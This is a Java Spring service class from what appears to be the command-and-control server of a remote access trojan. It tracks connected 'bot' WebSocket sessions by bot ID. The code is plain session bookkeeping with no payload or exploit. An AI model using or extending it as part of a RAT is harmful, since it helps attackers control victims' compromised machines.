package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import devs.alex.sah.rat.c2server.utils.Utils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.WebSocketSession;

import java.util.HashMap;
import java.util.Map;

@Slf4j
@Service
public class BotWebSocketSessionService implements WebSocketSessionService {

    /** String -> bot uuid
     */
    Map<String, WebSocketSession> activeBotsSessions = new HashMap<>();
    //ConcurrentWebSocketSessionDecorator

    @Override
    public void addSession(WebSocketSession session) {
        activeBotsSessions.put((String)session.getAttributes().get("botId"), session);
    }

    @Override
    public void removeSession(WebSocketSession session) {
        if(! activeBotsSessions.remove((String)session.getAttributes().get("botId"),session)){
            log.error("Failed to close session {}", session);
        }
    }

    @Override
    public Map<String, WebSocketSession> getSessions(HashMap<String, Object> filters) {
        return Utils.filter(filters, activeBotsSessions);
    }

    @Override
    public WebSocketSession getSession(String key) {
        return activeBotsSessions.get(key);
    }


}
